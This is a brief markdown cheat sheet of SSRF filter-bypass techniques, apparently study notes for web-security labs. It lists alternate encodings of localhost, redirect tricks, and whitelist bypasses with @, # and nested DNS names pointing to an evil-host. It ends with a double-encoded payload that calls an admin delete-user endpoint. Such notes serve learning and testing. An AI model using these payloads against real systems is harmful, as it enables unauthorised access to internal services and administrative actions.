---

---
# Circumventing common SSRF defenses

## SSRF with blacklist filters

- Bypassing `127.0.0.1` and other filters
    - `017700000001`
    - `2130706433`
    - `127.1`
    - `spoofed.burpcollaborator.net` redirects to `localhost`
    - Obfuscation using **URL encoding **
        - **(DONT FORGET TO TRY DOUBLE ENCODE) **eg admin ⇒ %2561dmin
    - URL that you control that redirects to the target URL
    - Change protocols (http, https etc)

## SSRF with whitelist filters

- Using `@` to indicate `hostname`
    - eg. `https://expected-host:fakepassword@evil-host`
- Using `#` to indicate an URL fragment
    - eg. `https://evil-host#expected-host`
- Exploiting *DNS naming hierarchy*
    - eg. `https://expected-host.evil-host`
- (Double) URL encoding!!!
- Use combinations (double encoded `#`)
    - eg. `http%3A%2F%2Flocalhost%3A80%2523%40stock.weliketoshop.net/admin/delete?username=carlos` 